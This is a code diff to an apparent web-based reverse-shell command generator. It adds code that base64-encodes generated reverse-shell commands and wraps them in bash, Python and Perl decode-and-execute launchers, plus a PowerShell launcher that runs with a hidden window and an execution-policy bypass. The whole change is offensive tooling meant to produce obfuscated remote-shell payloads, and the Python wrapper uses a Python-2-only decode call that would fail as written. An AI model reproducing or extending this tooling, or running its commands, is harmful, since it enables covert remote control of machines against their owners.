@@ -192,12 +192,31 @@ const rsg = {
             command = rsg.getReverseShellCommand()
         }
         command = rsg.insertParameters(command, (text) => text)
-        if (command.substring(0,4)=="bash"||command.substring(0,8)=="exec 5<>"||command.substring(0,11)=="0<&196;exec") {
+        if (command.substring(0,4)=="bash"||command.substring(0,8)=="exec 5<>"||command.substring(0,11)=="0<&196;exec") {//判断是否展示BashBase64反弹命令
             document.getElementById("bash-b64-reverse-shell-command").style.display="";
         }
         else{
             document.getElementById("bash-b64-reverse-shell-command").style.display= "none";
         }
+        if (command.substring(0,10)=="powershell") {//判断是否展示PowerShell反弹命令
+            document.getElementById("powershell-reverse-shell-command").style.display="";
+        }
+        else{
+            document.getElementById("powershell-reverse-shell-command").style.display= "none";
+        }   
+        if (command.substring(0,6)=="python"||command.substring(0,6)=="export") {//判断是否展示Python反弹命令
+            document.getElementById("python-reverse-shell-command").style.display="";
+        }
+        else{
+            document.getElementById("python-reverse-shell-command").style.display= "none";
+        }   
+        if (command.substring(0,4)=="perl") {//判断是否展示Perl反弹命令
+            document.getElementById("perl-reverse-shell-command").style.display="";
+        }
+        else{
+            document.getElementById("perl-reverse-shell-command").style.display= "none";
+        }   
+        
         const encoding = rsg.getEncoding();
         if (encoding === 'Base64') {
             command = rsg.insertParameters(command, (text) => text)
@@ -381,14 +400,16 @@ const rsg = {
         const selectedElement = elements.find((item) => item.innerText === rsg.currentCommandName);
         selectedElement?.classList.add("active");
     },
-
+//TODO：增加bash，powershell，python，perl
     updateReverseShellCommand: () => {
         const command = rsg.generateReverseShellCommand();
         const commandSelector = rsg.uiElements[rsg.commandType].command;
         document.querySelector(commandSelector).innerHTML = command;
-        var base = new Base64();
-        b64command = base.encode(htmlRestore(command));
+        b64command = btoa(htmlRestore(command));
         document.getElementById("bash-b64-reverse-shell-command").innerHTML ="bash -c {echo,"+ b64command+"}|{base64,-d}|{bash,-i}";
+        document.getElementById("powershell-reverse-shell-command").innerHTML ='powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc '+ b64command;
+        document.getElementById("python-reverse-shell-command").innerHTML ="python -c exec('" + b64command + "'.decode('base64'))";
+        document.getElementById("perl-reverse-shell-command").innerHTML ="perl -MMIME::Base64 -e eval(decode_base64('" + b64command + "'))";
     },
 
     updateSwitchStates: () => {
@@ -503,105 +524,3 @@ function htmlRestore(str) {
     s = s.replace(/&quot;/g, "\"");
     return s;
   };
-function Base64() {
-    // private property
-    _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
-
-    // public method for encoding
-    this.encode = function (input) {
-        var output = "";
-        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
-        var i = 0;
-        input = _utf8_encode(input);
-        while (i < input.length) {
-            chr1 = input.charCodeAt(i++);
-            chr2 = input.charCodeAt(i++);
-            chr3 = input.charCodeAt(i++);
-            enc1 = chr1 >> 2;
-            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
-            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
-            enc4 = chr3 & 63;
-            if (isNaN(chr2)) {
-                enc3 = enc4 = 64;
-            } else if (isNaN(chr3)) {
-                enc4 = 64;
-            }
-            output = output +
-                _keyStr.charAt(enc1) + _keyStr.charAt(enc2) +
-                _keyStr.charAt(enc3) + _keyStr.charAt(enc4);
-        }
-        return output;
-    }
-
-    // public method for decoding
-    this.decode = function (input) {
-        var output = "";
-        var chr1, chr2, chr3;
-        var enc1, enc2, enc3, enc4;
-        var i = 0;
-        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
-        while (i < input.length) {
-            enc1 = _keyStr.indexOf(input.charAt(i++));
-            enc2 = _keyStr.indexOf(input.charAt(i++));
-            enc3 = _keyStr.indexOf(input.charAt(i++));
-            enc4 = _keyStr.indexOf(input.charAt(i++));
-            chr1 = (enc1 << 2) | (enc2 >> 4);
-            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
-            chr3 = ((enc3 & 3) << 6) | enc4;
-            output = output + String.fromCharCode(chr1);
-            if (enc3 != 64) {
-                output = output + String.fromCharCode(chr2);
-            }
-            if (enc4 != 64) {
-                output = output + String.fromCharCode(chr3);
-            }
-        }
-        output = _utf8_decode(output);
-        return output;
-    }
-
-    // private method for UTF-8 encoding
-    _utf8_encode = function (string) {
-        string = string.replace(/\r\n/g, "\n");
-        var utftext = "";
-        for (var n = 0; n < string.length; n++) {
-            var c = string.charCodeAt(n);
-            if (c < 128) {
-                utftext += String.fromCharCode(c);
-            } else if ((c > 127) && (c < 2048)) {
-                utftext += String.fromCharCode((c >> 6) | 192);
-                utftext += String.fromCharCode((c & 63) | 128);
-            } else {
-                utftext += String.fromCharCode((c >> 12) | 224);
-                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
-                utftext += String.fromCharCode((c & 63) | 128);
-            }
-
-        }
-        return utftext;
-    }
-
-    // private method for UTF-8 decoding
-    _utf8_decode = function (utftext) {
-        var string = "";
-        var i = 0;
-        var c = c1 = c2 = 0;
-        while (i < utftext.length) {
-            c = utftext.charCodeAt(i);
-            if (c < 128) {
-                string += String.fromCharCode(c);
-                i++;
-            } else if ((c > 191) && (c < 224)) {
-                c2 = utftext.charCodeAt(i + 1);
-                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
-                i += 2;
-            } else {
-                c2 = utftext.charCodeAt(i + 1);
-                c3 = utftext.charCodeAt(i + 2);
-                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
-                i += 3;
-            }
-        }
-        return string;
-    }
-}
